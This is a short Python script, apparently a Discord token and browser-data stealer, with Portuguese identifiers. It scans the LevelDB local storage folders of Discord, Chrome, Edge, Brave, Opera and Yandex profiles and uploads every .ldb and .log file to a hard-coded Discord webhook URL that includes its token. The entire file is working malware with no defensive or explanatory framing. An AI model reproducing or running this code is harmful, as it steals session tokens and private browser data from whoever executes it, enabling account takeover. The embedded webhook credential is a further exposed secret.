import os
import requests
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
DB = "\\LOCAL STORAGE\\LEVELDB"
def send_files_to_discord_webhook(file_paths, WEBHOOK_URL):
    for file_path in file_paths:
        _, file_extension = os.path.splitext(file_path)
        if file_extension in ('.ldb', '.log'):
            with open(file_path, 'rb') as f:
                file_data = f.read()
                file_name = os.path.basename(file_path)
                response = requests.post(
                    WEBHOOK_URL,
                    data={'content': 'Novo arquivo encontrado:'},
                    files={'file': (file_name, file_data)}
                )
                
DIRETORIOS = [LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\DEFAULT" + DB, 
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 1" + DB, 
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 2" + DB,
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 3" + DB,
              ROAMING + "\\DISCORD" + DB,
              ROAMING + "\\DISCORDCANARY" + DB,
              ROAMING + "\\DISCORDPTB" + DB,
              LOCAL + "\\GOOGLE\\CHROME\\USER DATA\\DEFAULT" + DB,
              LOCAL + "\\GOOGLE\\CHROME\\USER DATA\\PROFILE 1" + DB,
              LOCAL + "\\GOOGLE\\CHROME\\USER DATA\\PROFILE 2" + DB,
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 3" + DB,
              ROAMING + "\\OPERA SOFTWARE\\OPERA STABLE" + DB,
              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\DEFAULT" + DB,
              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 1" + DB,
              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 2" + DB,
              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 3" + DB,
              ROAMING + "\\OPERA SOFTWARE\\OPERA GX STABLE" + DB,
              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\DEFAULT" + DB,
              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 1" + DB,
              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 2" + DB,
              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 3" + DB,
              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\DEFAULT" + DB]
WEBHOOK_URL = 'https://discord.com/api/webhooks/1054102989721313311/_oXOFzejbOqsb8Q5-LMIqmStS7iRJNwuoi88pH8DhlDXnm-n1rIv4mHFqXdlm8G6phwE'

for diretorio in DIRETORIOS:
    if os.path.exists(diretorio):
        files = [os.path.join(diretorio, f) for f in os.listdir(diretorio) if os.path.isfile(os.path.join(diretorio, f))]
        send_files_to_discord_webhook(files, WEBHOOK_URL)
    else:
        pass

DIRETORIOS2 = [LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 1" + DB,
               LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 2" + DB,
               LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\DEFAULT3" + DB]

for diretorio2 in DIRETORIOS2:
    if os.path.exists(diretorio2):
        files = [os.path.join(diretorio2, f) for f in os.listdir(diretorio2) if os.path.isfile(os.path.join(diretorio2, f))]
        send_files_to_discord_webhook(files, WEBHOOK_URL)
    else:
        pass
